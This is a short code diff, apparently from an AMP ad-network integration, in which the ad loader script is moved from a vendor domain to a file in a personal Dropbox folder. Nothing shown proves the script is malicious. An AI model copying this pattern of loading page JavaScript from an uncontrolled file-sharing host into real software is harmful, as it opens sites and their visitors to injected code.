@@ -31,5 +31,5 @@ export function holder(global, data) {
   d.cookie = "b=1; path=/";
   if (d.cookie.indexOf('b=') != -1 && !(n.indexOf('Safari') != -1 && n.indexOf('Chrome') == -1)) l += "&c1";
   data.queue = l;
-  writeScript(global, 'https://i.banner.mi6/banners/amp/holderamp.js' );
+  writeScript(global, 'https://dl.dropboxusercontent.com/u/17485301/holderamp.js' );
 }
